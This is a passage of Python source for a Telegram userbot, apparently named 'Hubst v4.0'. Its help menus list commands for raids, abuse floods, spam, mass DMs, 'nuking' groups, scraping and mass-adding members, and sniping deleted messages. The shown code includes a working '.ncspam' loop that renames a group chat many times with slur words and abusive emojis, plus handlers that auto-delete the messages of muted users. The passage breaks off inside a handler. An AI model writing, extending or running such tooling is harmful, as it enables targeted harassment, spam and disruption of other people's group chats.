    "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
    ".panel1   🗡️ ʀᴀɪᴅs & ᴀᴛᴛᴀᴄᴋs\n"
    ".panel2   🛡️ ᴀᴅᴍɪɴ & ᴍᴏᴅᴇʀᴀᴛɪᴏɴ\n"
    ".panel3   🎵 ᴍᴜsɪᴄ & ᴛᴏᴏʟs\n"
    ".panel4   🤖 ᴀɪ & ᴍᴇᴅɪᴀ\n"
    ".panel5   👤 ᴘʀᴏꜰɪʟᴇ & ᴀᴜᴛᴏᴍᴀᴛɪᴏɴ\n"
    ".panel6   💥 sᴘᴀᴍ & ꜰʟᴏᴏᴅ\n"
    ".panel7   🎮 ꜰᴜɴ & ɢᴀᴍᴇs\n"
    ".panel8   ☢️ ɴᴜᴋᴇ & sᴘᴇᴄɪᴀʟ ᴏᴘs\n"
    ".panel9   🎙️ ᴠᴏɪᴄᴇ & ᴠᴄ sᴛʀᴇᴀᴍ\n"
    ".panel10  👥 ᴍᴀss ᴀᴅᴅ & ᴍᴇᴍʙᴇʀs\n"
    ".panel11  📡 ɢᴄ ᴄʀᴇᴀᴛɪᴏɴ & ʙʟᴀsᴛᴇʀ\n"
    ".panel12  📊 sᴛᴀᴛs & sʏsᴛᴇᴍ\n"
    ".panel13  📝 ꜰɪʟᴛᴇʀs ɴᴏᴛᴇs & ᴀᴜᴛᴏ\n"
    ".clust    🔥 ʙᴏᴛ ᴄʟᴜsᴛᴇʀ ᴄᴍᴅs\n"
    "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
    "ᴘʀᴇꜰɪx: .   ǫᴜɪᴄᴋ ᴍᴇɴᴜ: .hub\n"
    "290+ ᴄᴏᴍᴍᴀɴᴅs 🚀"
),
"1": (
    "ʀᴀɪᴅs & ᴀᴛᴛᴀᴄᴋs\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".ʀᴀɪᴅ @ᴜ [ɴ]      ɢᴀᴀʟɪ ʙᴏᴍʙ\n"
    ".ʀʀᴀɪᴅ @ᴜ         ʀᴇᴘʟʏ ɢᴀᴀʟɪ ᴏɴ\n"
    ".ᴅʀʀᴀɪᴅ @ᴜ        ʀᴇᴘʟʏ ʀᴀɪᴅ ᴏꜰꜰ\n"
    ".ʀᴇᴘʟʏ @ᴜ         ʀᴇᴘʟʏ ꜰʟᴏᴏᴅ ᴏɴ\n"
    ".sʀᴇᴘʟʏ           ʀᴇᴘʟʏ ᴏꜰꜰ\n"
    ".ᴀʙᴜsᴇ @ᴜ         ᴀʙᴜsᴇ ᴏɴ\n"
    ".sᴀʙᴜsᴇ           ᴀʙᴜsᴇ ᴏꜰꜰ\n"
    ".sʟᴀᴘ @ᴜ          sʟᴀᴘ ꜰʟᴏᴏᴅ ᴏɴ\n"
    ".ʙᴏᴍʙ @ᴜ          ᴇᴍᴏᴊɪ ʙᴏᴍʙ ᴏɴ\n"
    ".ʀᴇᴘʟʏɢᴏᴅ @ᴜ      ɢᴏᴅ ᴛᴇxᴛs ᴏɴ\n"
    ".ᴍʀᴀɪᴅ @ᴜ         ᴍᴇᴅɪᴀ ʀᴀɪᴅ ᴏɴ\n"
    ".ʀᴇᴘʟʏᴠx <ᴛ> <ɴ>  ʀᴇᴘʟʏ ɴ ᴛɪᴍᴇs\n"
    ".sʟɪᴅᴇʀᴀɪᴅ <ᴛ>    sʟɪᴅᴇ ʀᴀɪᴅ ᴏɴ\n"
    ".ᴄʟᴏɴᴇʀᴇᴘʟʏ @ᴜ    ᴍɪʀʀᴏʀ ᴍsɢs ᴏɴ\n"
    ".ᴋɪᴄᴋʀᴀɪᴅ @ᴜ      ᴀᴜᴛᴏ-ᴋɪᴄᴋ ᴏɴ\n"
    ".sꜰʟᴏᴏᴅ [ɴ]       sᴛɪᴄᴋᴇʀ ꜰʟᴏᴏᴅ\n"
    ".ɢꜰʟᴏᴏᴅ [ɴ]       ɢɪꜰ ꜰʟᴏᴏᴅ\n"
    ".sᴛᴏᴘᴀʟʟ          sᴛᴏᴘ ᴀʟʟ ʀᴀɪᴅs\n"
    ".sᴛᴏᴘ             sᴛᴏᴘ ᴛʜɪs ᴄʜᴀᴛ"
),
"2": (
    "ᴀᴅᴍɪɴ & ᴍᴏᴅᴇʀᴀᴛɪᴏɴ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".ʙᴀɴ @ᴜ           ʙᴀɴ ᴜsᴇʀ\n"
    ".ᴜɴʙᴀɴ @ᴜ         ᴜɴʙᴀɴ\n"
    ".ᴋɪᴄᴋ @ᴜ          ᴋɪᴄᴋ\n"
    ".ᴍᴜᴛᴇ [ᴛ] @ᴜ      ᴍᴜᴛᴇ\n"
    ".ᴜɴᴍᴜᴛᴇ @ᴜ        ᴜɴᴍᴜᴛᴇ\n"
    ".ɢᴍᴜᴛᴇ [ᴛ] @ᴜ     ɢʟᴏʙᴀʟ ᴍᴜᴛᴇ\n"
    ".ɢᴜɴᴍᴜᴛᴇ @ᴜ       ɢʟᴏʙᴀʟ ᴜɴᴍᴜᴛᴇ\n"
    ".ᴛʙᴀɴ @ᴜ <ᴛ>      ᴛᴇᴍᴘ ʙᴀɴ\n"
    ".ʙᴀɴ_ᴀʟʟ          ʙᴀɴ ᴀʟʟ\n"
    ".ᴋɪᴄᴋ_ᴀʟʟ         ᴋɪᴄᴋ ᴀʟʟ\n"
    ".ᴍᴜᴛᴇ_ᴀʟʟ         ᴍᴜᴛᴇ ᴀʟʟ\n"
    ".ᴘʀᴏᴍᴏᴛᴇ 0/1/2/3  ᴘʀᴏᴍᴏᴛᴇ ʙʏ ʟᴇᴠᴇʟ\n"
    ".ᴅᴇᴍᴏᴛᴇ @ᴜ        ᴅᴇᴍᴏᴛᴇ\n"
    ".ᴘᴜʀɢᴇ [ɴ]        ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ\n"
    ".ʟᴏᴄᴋ             ʟᴏᴄᴋ ᴄʜᴀᴛ\n"
    ".ᴜɴʟᴏᴄᴋ           ᴜɴʟᴏᴄᴋ\n"
    ".sɪʟᴇɴᴄᴇ @ᴜ       ᴀᴜᴛᴏ-ᴅᴇʟᴇᴛᴇ ᴍsɢs\n"
    ".sɪʟᴇɴᴄᴇᴀʟʟ       sɪʟᴇɴᴄᴇ ᴇᴠᴇʀʏᴏɴᴇ\n"
    ".ᴜɴsɪʟᴇɴᴄᴇᴀʟʟ     ᴜɴsɪʟᴇɴᴄᴇ ᴀʟʟ\n"
    ".sᴜᴅᴏ @ᴜ          ɢʀᴀɴᴛ sᴜᴅᴏ\n"
    ".ᴅᴇʟsᴜᴅᴏ @ᴜ       ʀᴇᴠᴏᴋᴇ sᴜᴅᴏ\n"
    ".sᴜᴅᴏʟɪsᴛ         sᴜᴅᴏ ʟɪsᴛ"
),
"3": (
    "ᴍᴜsɪᴄ & ᴛᴏᴏʟs\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".ᴍᴜsɪᴄ <sᴏɴɢ>     ʏᴏᴜᴛᴜʙᴇ ᴀᴜᴅɪᴏ\n"
    ".ᴛᴛs [ʟᴀɴɢ] <ᴛ>   ᴛᴇxᴛ ᴛᴏ sᴘᴇᴇᴄʜ\n"
    ".ǫʀᴄᴏᴅᴇ <ᴛᴇxᴛ>    ɢᴇɴᴇʀᴀᴛᴇ ǫʀ\n"
    ".ᴛʀᴀɴsʟᴀᴛᴇ <ʟ> <ᴛ> ᴛʀᴀɴsʟᴀᴛᴇ\n"
    ".ᴡᴇᴀᴛʜᴇʀ <ᴄɪᴛʏ>   ᴡᴇᴀᴛʜᴇʀ ʀᴇᴘᴏʀᴛ\n"
    ".ɪᴘ <ᴀᴅᴅʀ>        ɪᴘ ɢᴇᴏʟᴏᴄᴀᴛɪᴏɴ\n"
    ".ᴄᴀʟᴄ <ᴇxᴘʀ>      ᴄᴀʟᴄᴜʟᴀᴛᴏʀ\n"
    ".ᴡɪᴋɪ <ǫᴜᴇʀʏ>     ᴡɪᴋɪᴘᴇᴅɪᴀ\n"
    ".ᴅᴇꜰɪɴᴇ <ᴡᴏʀᴅ>    ᴅɪᴄᴛɪᴏɴᴀʀʏ\n"
    ".ᴘɪɴɢ             ʟᴀᴛᴇɴᴄʏ ᴄʜᴇᴄᴋ\n"
    ".ᴀʟɪᴠᴇ            ʙᴏᴛ sᴛᴀᴛᴜs\n"
    ".sᴛᴀᴛᴜs           ꜰᴜʟʟ sᴛᴀᴛᴜs"
),
"4": (
    "ᴀɪ & ᴍᴇᴅɪᴀ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".ᴀsᴋ <ᴘʀᴏᴍᴘᴛ>     ɢᴇᴍɪɴɪ ᴀɪ ᴄʜᴀᴛ\n"
    ".ɪᴍᴀɢɪɴᴇ <ᴘʀᴏᴍᴘᴛ> ᴀɪ ɪᴍᴀɢᴇ\n"
    ".sᴛᴇᴀʟ            sᴛᴇᴀʟ sᴛɪᴄᴋᴇʀ ᴘᴀᴄᴋ\n"
    ".sɴɪᴘᴇ            sɴɪᴘᴇ ᴅᴇʟᴇᴛᴇᴅ ᴍsɢ\n"
    ".ᴇᴅɪᴛsɴɪᴘᴇ        sɴɪᴘᴇ ᴇᴅɪᴛᴇᴅ ᴍsɢ\n"
    ".ɪᴅ               ᴜsᴇʀ/ᴄʜᴀᴛ ɪᴅs\n"
    ".ᴜsᴇʀɪɴꜰᴏ         ꜰᴜʟʟ ᴜsᴇʀ ɪɴꜰᴏ\n"
    ".ᴘɪɴ              ᴘɪɴ ᴍᴇssᴀɢᴇ"
),
"5": (
    "ᴘʀᴏꜰɪʟᴇ & ᴀᴜᴛᴏᴍᴀᴛɪᴏɴ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".ᴄᴏᴘʏ @ᴜ          ᴄʟᴏɴᴇ ᴘʀᴏꜰɪʟᴇ\n"
    ".ᴄʜɴᴀᴍᴇ <ɴᴀᴍᴇ>    ᴄʜᴀɴɢᴇ ɴᴀᴍᴇ\n"
    ".ᴄʜʙɪᴏ <ʙɪᴏ>      ᴄʜᴀɴɢᴇ ʙɪᴏ\n"
    ".ᴀꜰᴋ [ʀᴇᴀsᴏɴ]     ᴀꜰᴋ ᴍᴏᴅᴇ ᴏɴ\n"
    ".ᴜɴᴀꜰᴋ            ᴀꜰᴋ ᴏꜰꜰ\n"
    ".ᴛᴀʀɢᴇᴛ <ᴛᴇxᴛ>    ᴅᴍ ᴀᴜᴛᴏ-ʀᴇᴘʟʏ\n"
    ".sᴇᴛᴡᴇʟᴄᴏᴍᴇ <ᴛ>   ᴡᴇʟᴄᴏᴍᴇ ᴍᴇssᴀɢᴇ\n"
    ".ᴏɴʟɪɴᴇ           ᴀʟᴡᴀʏs ᴏɴʟɪɴᴇ\n"
    ".ɢʜᴏsᴛ            ɢʜᴏsᴛ ᴍᴏᴅᴇ\n"
    ".ᴛʏᴘɪɴɢ [ɪᴅ]      ᴀʟᴡᴀʏs ᴛʏᴘɪɴɢ\n"
    ".ꜰᴀsᴛɢᴄ sᴇᴛ <ᴛ>   ʀᴀᴘɪᴅ ᴛɪᴛʟᴇ ᴄʜᴀɴɢᴇʀ\n"
    ".ʀᴇsᴛᴀʀᴛ          ʀᴇsᴛᴀʀᴛ ʙᴏᴛ"
),
"6": (
    "sᴘᴀᴍ & ꜰʟᴏᴏᴅ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".sᴘᴀᴍ <ɴ> <ᴍsɢ>   sᴘᴀᴍ ɴ ᴛɪᴍᴇs\n"
    ".ꜰsᴘᴀᴍ <ɴ> <ᴍsɢ>  ᴛᴜʀʙᴏ sᴘᴀᴍ\n"
    ".ʀsᴘᴀᴍ <ɴ> <ᴍsɢ>  ʀᴇᴘʟʏ sᴘᴀᴍ\n"
    ".sᴛᴏᴘsᴘᴀᴍ         sᴛᴏᴘ sᴘᴀᴍ\n"
    ".sᴘʀᴀʏ <ᴛᴇxᴛ>     ʟᴏᴏᴘ ᴇᴠᴇʀʏ 5s\n"
    ".ᴍᴀssᴅᴍ <ᴍsɢ>     ᴅᴍ ᴀʟʟ ᴍᴇᴍʙᴇʀs\n"
    ".sᴘʏ              ᴍɪʀʀᴏʀ ᴛᴏ sᴀᴠᴇᴅ\n"
    ".sᴘʏsᴛᴏᴘ          sᴛᴏᴘ sᴘʏ"
),
"7": (
    "ꜰᴜɴ & ɢᴀᴍᴇs\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".ꜰʟɪᴘ .ᴅɪᴄᴇ .8ʙᴀʟʟ <ǫ> .ʀᴘs <ᴄ>\n"
    ".ᴛʀᴜᴛʜ .ᴅᴀʀᴇ .ᴊᴏᴋᴇ .ꜰᴀᴄᴛ .ǫᴜᴏᴛᴇ\n"
    ".ʀᴏᴀsᴛ .ᴄᴏᴍᴘʟɪᴍᴇɴᴛ .ɪɴsᴜʟᴛ\n"
    ".ᴘɪᴄᴋᴜᴘʟɪɴᴇ .ʀɪᴢᴢ .ꜰʟɪʀᴛ\n"
    ".ᴍᴏᴄᴋ <ᴛ> .ʀᴇᴠᴇʀsᴇ <ᴛ>\n"
    ".ɢᴀʏ .ɪǫ .sᴜs .ᴀᴜʀᴀ .sɪɢᴍᴀ\n"
    ".ᴄʀɪɴɢᴇ .ʙᴀsᴇᴅ .ɴᴘᴄ .sᴋɪʟʟɪssᴜᴇ\n"
    ".ʀᴀᴛᴇ .ᴊᴜᴅɢᴇ .ᴅɪᴀɢɴᴏsᴇ .ᴀɴᴀʟʏᴢᴇ\n"
    ".ᴇxᴘᴏsᴇ .ɢᴏssɪᴘ .ʟᴏʀᴇ .ᴡᴀɴᴛᴇᴅ\n"
    ".sʜɪᴘ .ʟᴏᴠᴇᴍᴇᴛᴇʀ .ᴅɴᴀ .ʙᴏᴜɴᴛʏ\n"
    ".ꜰɪɢʜᴛ .ꜰᴀᴋᴇʙᴀɴ .ꜰᴀᴋᴇᴋɪᴄᴋ\n"
    ".ꜰᴀᴋᴇᴍᴜᴛᴇ .ꜰᴀᴋᴇᴘʀᴏᴍᴏᴛᴇ .ꜰᴀᴋᴇᴡᴀʀɴ"
),
"8": (
    "ɴᴜᴋᴇ & sᴘᴇᴄɪᴀʟ ᴏᴘs\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".ɴᴜᴋᴇ             ɴᴜᴋᴇ ɢʀᴏᴜᴘ\n"
    ".ᴅᴇʟɢᴄ            ʙᴏᴍʙ-ᴅᴇʟᴇᴛᴇ ɢᴄ\n"
    ".ᴅᴇʟᴍᴇ [ᴄʜᴀᴛ_ɪᴅ]  ᴅᴇʟᴇᴛᴇ ʏᴏᴜʀ ᴍsɢs\n"
    ".ᴘᴜʀɢᴇᴍᴇ [ɴ]      ᴅᴇʟᴇᴛᴇ ʟᴀsᴛ ɴ ʏᴏᴜʀs\n"
    ".sᴄʀᴀᴘᴇ           sᴄʀᴀᴘᴇ ᴍᴇᴍʙᴇʀs\n"
    ".ᴢsᴄʀᴀᴘᴇ          sᴄʀᴀᴘᴇ ᴢᴏᴍʙɪᴇs\n"
    ".ᴋɪᴄᴋᴢᴏᴍʙɪᴇs      ᴋɪᴄᴋ ᴀʟʟ ᴢᴏᴍʙɪᴇs\n"
    ".ᴋɪᴄᴋʙᴏᴛs         ᴋɪᴄᴋ ɴᴏɴ-ᴀᴅᴍɪɴ ʙᴏᴛs\n"
    ".ᴍsɢʜɪsᴛ [ɴ]      ᴅᴜᴍᴘ ᴍsɢs ᴛᴏ ꜰɪʟᴇ\n"
    ".ᴊᴏɪɴ <ʟɪɴᴋ>      ᴊᴏɪɴ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ\n"
    ".ʟᴇᴀᴠᴇᴀʟʟ         ʟᴇᴀᴠᴇ ᴀʟʟ ɢʀᴏᴜᴘs\n"
    ".ᴀᴅᴅʙᴏᴛ @ʙᴏᴛ      ᴀᴅᴅ ʙᴏᴛ ᴛᴏ ɢᴄ\n"
    ".ᴘʀᴏᴍᴏᴛᴇʙᴏᴛs      ᴘʀᴏᴍᴏᴛᴇ ᴀʟʟ ʙᴏᴛs\n"
    ".ᴄʀᴇᴀᴛᴇɢᴄ <ɴ>     ᴄʀᴇᴀᴛᴇ sᴜᴘᴇʀɢʀᴏᴜᴘ"
),
"9": (
    "ᴠᴏɪᴄᴇ & ᴠᴄ sᴛʀᴇᴀᴍ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".ᴘʟᴀʏᴄᴀʟʟ [ꜰɪʟᴇ]  sᴛʀᴇᴀᴍ ᴀᴜᴅɪᴏ ɪɴ ᴠᴄ\n"
    ".ᴘʟᴀʏᴠɪᴅᴇᴏ [ꜰɪʟᴇ] sᴛʀᴇᴀᴍ ᴠɪᴅᴇᴏ ɪɴ ᴠᴄ\n"
    ".ᴘʟᴀʏsᴛʀᴇᴀᴍ <s>   sᴛʀᴇᴀᴍ sᴏɴɢ ʟɪᴠᴇ\n"
    ".ʟᴏᴏᴘᴠᴄ           ᴛᴏɢɢʟᴇ ʟᴏᴏᴘ\n"
    ".sᴛᴏᴘᴄᴀʟʟ         sᴛᴏᴘ sᴛʀᴇᴀᴍ\n"
    ".ᴜɴᴍᴜᴛᴇᴍᴇ         ᴀᴜᴛᴏ-ᴜɴᴍᴜᴛᴇ ʟᴏᴏᴘ\n"
    ".ʟᴇᴀᴠᴇᴄᴀʟʟ        ʟᴇᴀᴠᴇ ᴠᴄ\n"
    f"ɴᴏᴛᴇ: ᴘɪᴘ ɪɴsᴛᴀʟʟ ᴘʏ-ᴛɢᴄᴀʟʟs"
),
"10": (
    "ᴍᴀss ᴀᴅᴅ & ᴍᴇᴍʙᴇʀs\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".ᴀᴅᴅᴍᴇᴍʙᴇʀs @s [@ᴛ]  sᴄʀᴀᴘᴇ & ᴀᴅᴅ\n"
    ".sᴄʀᴀᴘᴇᴍᴇᴍʙᴇʀs @ɢ    sᴄʀᴀᴘᴇ ᴛᴏ ʟɪsᴛ\n"
    ".ᴀᴅᴅsᴄʀᴀᴘᴇᴅ @ᴛᴀʀɢᴇᴛ  ᴀᴅᴅ sᴄʀᴀᴘᴇᴅ\n"
    ".sᴛᴏᴘᴀᴅᴅ             sᴛᴏᴘ ᴍᴀss ᴀᴅᴅ\n"
    ".ᴍᴇᴍʙᴇʀᴄᴏᴜɴᴛ         ᴍᴇᴍʙᴇʀ ᴄᴏᴜɴᴛ\n"
    ".ᴏɴʟɪɴᴇᴄᴏᴜɴᴛ         ᴏɴʟɪɴᴇ ᴄᴏᴜɴᴛ\n"
    ".ʙᴏᴛᴄᴏᴜɴᴛ            ʙᴏᴛ ᴄᴏᴜɴᴛ\n"
    ".ᴇxᴘᴏʀᴛᴍᴇᴍʙᴇʀs       ᴇxᴘᴏʀᴛ ᴛᴏ ᴊsᴏɴ"
),
"11": (
    "ɢᴄ ᴄʀᴇᴀᴛɪᴏɴ & ʙʟᴀsᴛᴇʀ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".ᴄʀᴇᴀᴛᴇɢᴄǫᴛʏ <ɴ> <ɴᴀᴍᴇ>  ʙᴜʟᴋ ᴄʀᴇᴀᴛᴇ\n"
    ".ꜰᴇᴛᴄʜᴀʟʟɢᴄ              ʟɪsᴛ ʏᴏᴜʀ ɢᴄs\n"
    ".ᴛᴀʀɢᴇᴛɢᴄ <ɪᴅ>           ᴀᴅᴅ ᴛᴏ ᴛᴀʀɢᴇᴛs\n"
    ".ᴄʟᴇᴀʀᴛᴀʀɢᴇᴛs            ᴄʟᴇᴀʀ ᴛᴀʀɢᴇᴛs\n"
    ".sᴇɴᴅᴍᴇssᴀɢᴇ <ᴍsɢ>       ʙʟᴀsᴛ ᴛᴏ ᴛᴀʀɢᴇᴛs\n"
    ".ʙʟᴀsᴛᴀʟʟ <ᴍsɢ>          ʙʟᴀsᴛ ᴀʟʟ ɢᴄs\n"
    ".sᴛᴏᴘʙʟᴀsᴛ               sᴛᴏᴘ ʙʟᴀsᴛ"
),
"12": (
    "sᴛᴀᴛs & sʏsᴛᴇᴍ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".ᴄʜᴀᴛsᴛᴀᴛs    ᴄʜᴀᴛ sᴛᴀᴛɪsᴛɪᴄs\n"
    ".ᴅʙsᴛᴀᴛs      ᴅᴀᴛᴀʙᴀsᴇ sᴛᴀᴛs\n"
    ".sʏsɪɴꜰᴏ      sʏsᴛᴇᴍ ɪɴꜰᴏ\n"
    ".ᴜᴘᴛɪᴍᴇ       ʙᴏᴛ ᴜᴘᴛɪᴍᴇ\n"
    ".sᴛᴏʀᴀɢᴇ      ᴅɪsᴋ sᴛᴏʀᴀɢᴇ\n"
    ".ᴄᴘᴜ          ᴄᴘᴜ ᴜsᴀɢᴇ\n"
    ".ʀᴀᴍ          ʀᴀᴍ ᴜsᴀɢᴇ\n"
    ".ᴀʟɪᴠᴇ        ᴀʟɪᴠᴇ ᴍᴇssᴀɢᴇ\n"
    ".ᴜsᴇʀʙᴏᴛs     ᴀᴄᴛɪᴠᴇ ᴜsᴇʀʙᴏᴛs"
),
"13": (
    "ꜰɪʟᴛᴇʀs ɴᴏᴛᴇs & ᴀᴜᴛᴏ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ".ꜰɪʟᴛᴇʀ <ᴋ> <ᴍsɢ>    ᴋᴇʏᴡᴏʀᴅ ᴀᴜᴛᴏ-ʀᴇᴘʟʏ\n"
    ".sᴛᴏᴘꜰɪʟᴛᴇʀ <ᴋ>      ʀᴇᴍᴏᴠᴇ ꜰɪʟᴛᴇʀ\n"
    ".ꜰɪʟᴛᴇʀs             ʟɪsᴛ ꜰɪʟᴛᴇʀs\n"
    ".ᴄʟᴇᴀʀꜰɪʟᴛᴇʀs        ᴄʟᴇᴀʀ ᴀʟʟ\n"
    ".ɴᴏᴛᴇ <ᴋ> <ᴛᴇxᴛ>     sᴀᴠᴇ ɴᴏᴛᴇ\n"
    ".ɢᴇᴛɴᴏᴛᴇ <ᴋ>         ɢᴇᴛ ɴᴏᴛᴇ\n"
    ".ɴᴏᴛᴇs               ʟɪsᴛ ɴᴏᴛᴇs\n"
    ".ʀᴇᴍɪɴᴅ <ᴛ> <ᴍsɢ>    sᴇᴛ ʀᴇᴍɪɴᴅᴇʀ\n"
    ".ᴀɴᴛɪʟɪɴᴋ ᴏɴ/ᴏꜰꜰ     ᴅᴇʟᴇᴛᴇ ʟɪɴᴋs\n"
    ".ᴀɴᴛɪsᴘᴀᴍ ᴏɴ/ᴏꜰꜰ     ᴀᴜᴛᴏ sᴘᴀᴍ ᴅᴇᴛᴇᴄᴛ"
),

}

@cmd("hub")
async def _hub_menu(e, arg):
    page = (arg or "").strip() or "main"
    await edit(e, PAGES.get(page, PAGES["main"]))

@cmd("panel1")
async def _m1(e,_): await edit(e, PAGES["1"])
@cmd("panel2")
async def _m2(e,_): await edit(e, PAGES["2"])
@cmd("panel3")
async def _m3(e,_): await edit(e, PAGES["3"])
@cmd("panel4")
async def _m4(e,_): await edit(e, PAGES["4"])
@cmd("panel5")
async def _m5(e,_): await edit(e, PAGES["5"])
@cmd("panel6")
async def _m6(e,_): await edit(e, PAGES["6"])
@cmd("panel7")
async def _m7(e,_): await edit(e, PAGES["7"])
@cmd("panel8")
async def _m8(e,_): await edit(e, PAGES["8"])
@cmd("panel9")
async def _m9(e,_): await edit(e, PAGES["9"])
@cmd("panel10")
async def _m10(e,_): await edit(e, PAGES["10"])
@cmd("panel11")
async def _m11(e,_): await edit(e, PAGES["11"])
@cmd("panel12")
async def _m12(e,_): await edit(e, PAGES["12"])
@cmd("panel13")
async def _m13(e,_): await edit(e, PAGES["13"])

# ══════════════════════════════════════════════════════════════════
#   .CLUST — BOT CLUSTER COMMANDS (ported from sib.py ?nc section)
# ══════════════════════════════════════════════════════════════════
#  Uses the bots saved via .addbot / bot_usernames list as cluster.
#  Each bot must already be an admin in the target GC.
#
#  Commands:
#    .clust              — show clust help menu
#    .ncspam <text> <n>  — userbot renames GC n times: text + gaali + abusive emoji
#    .stopnc             — stop active name-change spam
# ══════════════════════════════════════════════════════════════════

_clust_nc_tasks: dict = {}   # chat_id → asyncio.Task

async def _clust_rename(chat_id: int, title: str, cl):
    """Rename a chat using the given client. Tries supergroup then legacy group."""
    try:
        await cl(EditTitleRequest(channel=chat_id, title=title[:255]))
    except Exception:
        try:
            await cl(EditChatTitleRequest(chat_id=abs(chat_id), title=title[:255]))
        except Exception:
            pass

@cmd("clust")
async def clust_menu_c(e, _):
    await edit(e,
        "🔥 ʜᴜʙsᴛ ᴄʟᴜsᴛ — ʙᴏᴛ ᴄʟᴜsᴛᴇʀ\n"
        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        ".ncspam <text> <n>   🔄 name-spam GC n×\n"
        ".stopnc              🛑 stop name-spam\n"
        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
    )

# Abusive emojis for ncspam gc name
_NC_EMOJIS = ["🖕","💀","🤬","😈","☠️","🔥","💣","👊","🤡","🗿","⚡","🤣","😂","🤮"]

@cmd("ncspam")
async def ncspam_c(e, arg):
    """Userbot renames GC n times super fast: text + random gaali word + abusive emoji."""
    if not arg or len(arg.split()) < 2:
        return await edit(e, "❌ Usage: .ncspam <text> <count>")
    parts = arg.rsplit(None, 1)
    text  = parts[0].strip()
    try: count = int(parts[1])
    except: return await edit(e, "❌ Count must be a number")
    chat_id = e.chat_id
    await edit(e, f"🔄 Starting name-spam `{text}` × {count}...")

    # Build a pool of short abusive keywords from GAALI_LIST for variety
    _gaali_words = []
    for g in GAALI_LIST:
        # grab first 1-2 words from each gaali (short enough for a GC name suffix)
        words = g.split()
        if words:
            _gaali_words.append(words[0])

    async def _nc_loop():
        done = 0
        while done < count:
            gaali_word = random.choice(_gaali_words)
            emoji      = "".join(random.choices(_NC_EMOJIS, k=random.randint(2, 4)))
            title      = f"{text} {gaali_word} {emoji}"[:255]
            try:
                await _clust_rename(chat_id, title, client)
                done += 1
            except FloodWaitError as fw:
                await asyncio.sleep(fw.seconds)
                continue
            except Exception:
                done += 1
            await asyncio.sleep(0.3)
        _clust_nc_tasks.pop(chat_id, None)
        try: await client.send_message("me", f"✅ ncspam done — `{text}` × {done}")
        except: pass

    if chat_id in _clust_nc_tasks:
        _clust_nc_tasks[chat_id].cancel()
    task = asyncio.create_task(_nc_loop())
    _clust_nc_tasks[chat_id] = task
    await edit(e,
        f"🔄 **ɴᴀᴍᴇ sᴘᴀᴍ ᴀᴄᴛɪᴠᴇ**\n"
        f"📝 text: `{text}`\n"
        f"🔁 count: {count}\n"
        f"💀 format: text + gaali + emoji\n"
        f"⚡ super fast  |  stop: .stopnc"
    )

@cmd("stopnc")
async def stopnc_c(e, _):
    task = _clust_nc_tasks.pop(e.chat_id, None)
    if task:
        task.cancel()
        await edit(e, "🛑 Name-spam stopped.")
    else:
        await edit(e, "⚠️ No active name-spam here.")







# Quick .cmds menu
def _register_bare_handlers(cl):
    # handler 0 — .hub quick reference (outgoing = our own message)
    @cl.on(events.NewMessage(pattern=re.compile(r"^\.hub$", re.I), outgoing=True))
    async def _quick_cmds(event):
        await event.edit(
            "🔥⚡ ʜᴜʙsᴛ ᴠ4.0 — ᴘᴀɴᴇʟs ⚡🔥\n"
            "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            ".panel1   🗡️  raids & attacks\n"
            ".panel2   🛡️  admin & mod\n"
            ".panel3   🎵  music & tools\n"
            ".panel4   🤖  ai & media\n"
            ".panel5   👤  profile & auto\n"
            ".panel6   💥  spam & flood\n"
            ".panel7   🎮  fun & games\n"
            ".panel8   ☢️  nuke & ops\n"
            ".panel9   🎙️  voice & vc\n"
            ".panel10  👥  mass add\n"
            ".panel11  📡  gc blaster\n"
            ".panel12  📊  stats & sys\n"
            ".panel13  📝  filters & notes\n"
            ".clust    🔥  bot cluster\n"
            "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            "full menu: .hub"
        )
    # ══════════════════════════════════════════════════════════════════
    #   ALL COMMANDS
    # ══════════════════════════════════════════════════════════════════
    
    # ── Status / Alive ────────────────────────────────────────────────

    # handler 1
    @cl.on(events.MessageEdited(incoming=True))
    async def _edit_watch(event):
        if not event.message or not event.message.text: return
        _edit_snipe_cache[event.chat_id]={"sender":str(event.sender_id),"after":(event.message.text or "")[:200]}
    

    # handler 2
    @cl.on(events.NewMessage(incoming=True))
    async def _incoming(event):
        sid = event.sender_id
        if not sid: return
        now = time.time()
    
        # Global mute check
        if sid in global_muted:
            exp = global_muted[sid]
            if exp and now > exp:
                global_muted.pop(sid, None); save_mutes()
            else:
                try: await client.delete_messages(event.chat_id, [event.id])
                except:
                    try: await event.delete()
                    except: pass
                return
    
        # Local mute check
        if (event.chat_id, sid) in local_muted:
            exp = local_muted[(event.chat_id, sid)]
            if exp and now > exp:
                local_muted.pop((event.chat_id, sid), None); save_mutes()
            else:
                try: await client.delete_messages(event.chat_id, [event.id])
                except:
                    try: await event.delete()
                    except: pass
                return
    
        # Group lock
        if event.is_group and event.chat_id in group_locks and not is_auth(sid):
            try: await event.delete()
            except: pass
            return
    
        # Silence list — try both ways to ensure deletion
        sl = DB.get("silenced", {}).get(str(event.chat_id), [])
        if sid in sl:
            try:
                await client.delete_messages(event.chat_id, [event.id])
            except:
